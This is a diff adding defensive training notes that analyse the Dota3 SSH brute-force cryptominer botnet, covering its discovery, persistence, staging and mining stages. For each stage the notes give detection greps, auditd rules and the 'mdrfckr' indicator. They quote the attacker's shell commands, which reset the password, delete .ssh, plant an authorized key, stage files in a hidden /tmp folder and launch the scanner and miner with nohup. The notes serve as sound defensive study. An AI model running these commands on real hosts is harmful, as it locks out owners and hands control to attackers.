@@ -236,3 +236,203 @@ If the victim is reachable over SSH, the attacker can run `scp` or `sftp` **from
 - Watch for `chmod +x` right after a download, and download-and-run patterns (`curl | sh`)
 - Cryptominer signs: process named `xmrig`, high sustained CPU, connections to mining pools (general knowledge)
 - Windows parallel: the same Ingress Tool Transfer note, with `certutil`, `curl.exe`, and `Invoke-WebRequest` instead of `wget`/`curl`/`scp`
+
+---
+
+# Dota3 Malware Analysis (Linux SSH Botnet)
+
+Dota3 is a simple but well-known cryptominer botnet that still infects systems worldwide. It shows how the earlier tactics (Initial Access, Discovery, Persistence) chain together in a real attack. Based on CounterCraft and SANS reports; some actions are simplified.
+
+## Attack Chain
+
+| Stage | What Dota3 does |
+|---|---|
+| Initial Access | Botnet brute-forces SSH |
+| Discovery | Automated commands, CPU/RAM checks |
+| Persistence | Changes password, replaces SSH keys |
+| Impact | Cryptomining (the goal) |
+
+## Initial Access: SSH Brute Force
+
+- Botnet of 2000+ distinct IPs across 94 countries
+- Scans the Internet for open SSH
+- Brute-forces mainly the `root` user with the top 1000 weak passwords
+- On a correct guess, one botnet host logs in over SSH and continues
+- Matches the Hack and Forget pattern (weak SSH password, scanned at scale)
+
+## Discovery
+
+Automated: many commands in quick succession from the SSH session.
+
+    # CPU and RAM information
+    cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
+    free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
+    lscpu | grep Model
+    # Unclear purpose
+    ls -lh $(which ls)
+    # Generic Discovery
+    crontab -l
+    w
+    uname -m
+
+| Command | Learns |
+|---|---|
+| `cat /proc/cpuinfo`, `lscpu` | CPU model |
+| `free -m` | RAM size |
+| `ls -lh $(which ls)` | Unclear; likely checks the `ls` binary (size, tampering). My guess, not in the source |
+| `crontab -l` | Existing scheduled jobs (competing malware, or a place to persist) |
+| `w` | Who else is logged in |
+| `uname -m` | CPU architecture (picks the right miner binary) |
+
+- CPU and RAM queries point to a **cryptominer**: few other malware types need them
+- Same specialized-discovery pattern as the earlier miner row (`cat /proc/cpuinfo`, `lscpu`, `free -m`)
+
+## Persistence
+
+    echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash >> up.txt
+    cd ~
+    rm -rf .ssh
+    mkdir .ssh
+    # "mdrfckr" comment is unique to this attack
+    echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
+    chmod -R go= ~/.ssh
+
+| Step | Effect |
+|---|---|
+| `passwd` with a new complex password | Locks out competitor botnets that guess the old weak one |
+| `rm -rf .ssh` | Deletes all existing SSH keys, so the real owner loses key access |
+| New `.ssh/authorized_keys` with the attacker's key | Reliable access whenever needed |
+| `chmod -R go= ~/.ssh` | Removes group and other permissions, so SSH accepts the key file |
+
+- The attacker secures the victim from other attackers, to keep it as their own
+- The injected key ends with the comment `mdrfckr`: a unique, searchable indicator
+- The `echo -e ... | passwd` line feeds the current password, then the new password twice, into `passwd` (my reading; the trailing `| bash` and `>> up.txt` look like a logging quirk of the original script)
+- The owner is locked out of both password and keys, so a "my login stopped working" report can be the first sign
+
+## Detecting the Attack
+
+In a real SOC with a SIEM, expect several alerts at once:
+- SSH login from a known malicious IP
+- Spike of Discovery commands
+- Match for the string `mdrfckr`
+
+Manual detection:
+
+| Log source | Command | What to look for |
+|---|---|---|
+| Auth logs | `cat /var/log/auth.log \| grep "Accepted"` | Successful **password** SSH logins from untrusted, external IPs |
+| Auditd process logs | `ausearch -i -x [command]` | Discovery commands (`uname`, `lscpu`) and their origin |
+
+## Detection Tips
+
+- Brute force then success, same pattern as the SSH detection notes:
+
+        grep "Failed password" /var/log/auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c | sort -nr
+        grep "Accepted password" /var/log/auth.log
+
+- Hunt the known indicator across the system:
+
+        grep -r "mdrfckr" /root /home 2>/dev/null
+
+- Check every user's `~/.ssh/authorized_keys` for unknown keys or a recent change time
+- Auditd: the `rm -rf .ssh` and `authorized_keys` write fit a file-watch rule (general knowledge; same syntax style as the auditd note):
+
+        -w /root/.ssh/authorized_keys -p wa -k ssh_keys
+
+- Auth log may also show a password change (`passwd[...]: password for 'ubuntu' changed`), as in the user management section of the auth.log note
+- Walk the process tree for the Discovery burst: the parent should be an `sshd` session from an external IP (see the process tree note)
+- Cryptominer signs: high sustained CPU, process like `xmrig`, connections to mining pools
+- Prevention (general knowledge, not in the source):
+  - Disable SSH password login and root login
+  - Use key-only authentication with a rate limiter like `fail2ban`
+  - Avoid weak passwords like the lab's `ubuntu123`
+ 
+---
+
+# Dota3 Cryptominer Setup
+
+The attackers already have SSH access and a changed password, so they upload the tools and run them. This continues the Dota3 chain from the previous note.
+
+## Step 1: Transfer the Malware
+
+    user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
+
+- Uses the `ubuntu` password the attackers set earlier (Option 1 from the Ingress Tool Transfer note)
+- Runs on the **attacker's** machine, so no `scp` shows in the victim's auditd; only the SSH login appears in `auth.log`
+- Lands in `/tmp`, writable by everyone
+
+## Step 2: Stage in a Hidden Folder
+
+    cd /tmp
+    rm -rf .X2*
+    mkdir .X26-unix
+    cd .X26-unix
+    tar xf dota3.tar.gz
+    sleep 3s
+    cd /tmp/.X26-unix/.rsync/c
+
+| Command | Purpose |
+|---|---|
+| `rm -rf .X2*` | Removes old copies (e.g. from earlier infections), so the new install starts clean |
+| `mkdir .X26-unix` | Hidden folder (leading dot) |
+| `tar xf dota3.tar.gz` | Unpacks the malware to `/tmp/.X26-unix/.rsync/c` |
+| `sleep 3s` | Waits for unpacking to finish |
+
+- Names are chosen to look legitimate:
+  - `.X26-unix` imitates the real `/tmp/.X11-unix` folder (general knowledge: used by the X Window System)
+  - `.rsync` imitates the real `rsync` tool
+- Goal: discourage the IT team from investigating
+- Leading dot hides them from a plain `ls` (use `ls -la`)
+
+## Step 3: Run the Binaries
+
+    # Scan the internal network with "tsm"
+    nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
+    sleep 8m
+    nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
+    sleep 20m
+    # Run the cryptominer "initall"
+    cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
+    exit 0
+
+| Binary | Role |
+|---|---|
+| `tsm` | Customized network scanner: probes the internal network for other hosts with exposed SSH (port 22) |
+| `initall` | XMRig cryptominer: loads the CPU to earn revenue for the attackers |
+
+- `192.168` and `172.16` are private ranges, so the scan hunts internal victims (lateral spread)
+- The scan results go to `/tmp/up.txt` (the same filename as in the persistence step)
+- The scans run first, with waits (`sleep 8m`, `sleep 20m`) between steps
+- `nohup` keeps processes running **after the SSH session closes**, so the attack outlives the login
+- `>> /dev/null` discards output to hide it
+- `2>1&` is a typo of the usual `2>&1 &`: as written it redirects errors to a **file named `1`** and runs in the background (my reading of the shell syntax; harmless to the attacker)
+- This is a horizontal scan: one port (22) across many hosts, as in the network scanning notes
+
+## Detecting the Attack
+
+| Source | Indicator |
+|---|---|
+| Auditd | Creation of untrusted, hidden files and folders in `/tmp` |
+| Auditd | Creation of files named like known malware, e.g. `dota3.tar.gz` |
+| Auditd | Commands often seen in attacks, such as `nohup` |
+| Network traffic | SSH port scan of all `192.168.*` and `172.16.*` networks |
+| EDR | XMRig is blocked by most EDRs ([VirusTotal example](https://www.virustotal.com/); the lesson's exact link wasn't in the paste) |
+
+## Detection Tips
+
+- List hidden items in `/tmp`:
+
+        ls -la /tmp
+        find /tmp -name ".*" -type d
+
+- Find processes running from `/tmp`:
+
+        ps aux | grep /tmp
+        ausearch -i -x nohup
+
+- Check the process tree (see the earlier note): `tsm` and `initall` should have `sshd` or `init` as ancestors, not a normal service
+- High sustained CPU from an unknown process points to the miner (general knowledge)
+- Port 22 scanning from one internal host to many: look in firewall or flow logs for one source hitting many destinations on 22
+- `nohup` from an SSH session is uncommon for normal admin work; consider alerting on it
+- Cleanup note: killing the miner isn't enough; remove the attacker's key from `authorized_keys` (the `mdrfckr` key) and reset passwords, or they come back
+- Full Dota3 chain: SSH brute force → Discovery → persistence (key swap) → SCP upload → hidden `/tmp` staging → scanner and miner
